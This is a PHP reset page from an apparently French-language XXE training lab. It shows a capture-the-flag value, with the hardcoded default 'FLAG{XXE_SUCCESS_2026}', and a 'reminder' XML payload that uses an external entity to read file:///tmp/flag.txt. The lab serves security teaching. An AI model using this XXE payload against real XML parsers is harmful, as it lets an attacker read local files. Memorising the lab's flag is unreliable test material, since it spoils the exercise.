<?php
/**
 * Reset Endpoint - Réinitialise le lab et affiche le flag
 */

// Nettoyer ? (optionnel, ici on ne fait rien car pas de fichiers)
$message = "✅ Lab réinitialisé - Tous les fichiers sont intacts";

// Lire le flag
$flag_file = '/tmp/flag.txt';
if (file_exists($flag_file)) {
    $flag = trim(file_get_contents($flag_file));
} else {
    $flag = "FLAG{XXE_SUCCESS_2026}"; // Valeur par défaut
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Reset - XXE Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container" style="margin-top: 50px;">
        <div class="upload-card" style="text-align: center;">
            <h1>🔄 Réinitialisation du Lab XXE</h1>
            
            <div class="success-message" style="margin: 20px 0; padding: 20px;">
                <?php echo $message; ?>
            </div>
            
            <!-- 🏆 Section Flag -->
            <div style="background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%); 
                        padding: 30px; 
                        border-radius: 10px; 
                        margin: 25px 0;
                        border: 2px solid #FFD700;
                        box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);">
                
                <h2 style="color: #FFD700; margin-bottom: 20px; display: flex; align-items: center; justify-content: center;">
                    <span style="font-size: 2.5rem; margin-right: 10px;">🏆</span> FLAG DE VALIDATION
                </h2>
                
                <div style="background: #000; 
                            padding: 20px; 
                            border-radius: 8px; 
                            margin: 15px 0;
                            border: 1px solid #FFD700;">
                    
                    <p style="color: #FFD700; font-size: 1.2rem; margin-bottom: 15px;">🔑 Flag (constant) :</p>
                    
                    <p style="font-family: 'Courier New', monospace; 
                              font-size: 2.5rem; 
                              font-weight: bold;
                              background: #0a0a0a;
                              padding: 20px;
                              border-radius: 5px;
                              color: #00ff00;
                              letter-spacing: 3px;
                              text-shadow: 0 0 15px #00ff00;
                              border: 2px solid #00ff00;
                              word-break: break-all;">
                        <?php echo htmlspecialchars($flag); ?>
                    </p>
                    
                    <p style="color: #FFD700; margin-top: 15px; font-size: 1rem;">
                        ⚡ À communiquer à l'équipe WP1/WP2
                    </p>
                </div>
                
                <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; text-align: left; margin-top: 15px;">
                    <p style="color: #FFD700; margin-bottom: 5px;">🎯 Rappel : comment obtenir ce flag</p>
                    <pre style="background: #000; color: #0f0; padding: 10px; overflow-x: auto;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY xxe SYSTEM "file:///tmp/flag.txt"&gt;
]&gt;
&lt;reservation&gt;
    &lt;nom&gt;&xxe;&lt;/nom&gt;
    &lt;vol&gt;AF123&lt;/vol&gt;
&lt;/reservation&gt;</pre>
                </div>
            </div>
            
            <a href="index.php" class="btn-primary" style="display: inline-block; text-decoration: none; margin-top: 10px;">
                Retour à l'accueil
            </a>
        </div>
    </div>
</body>
</html>
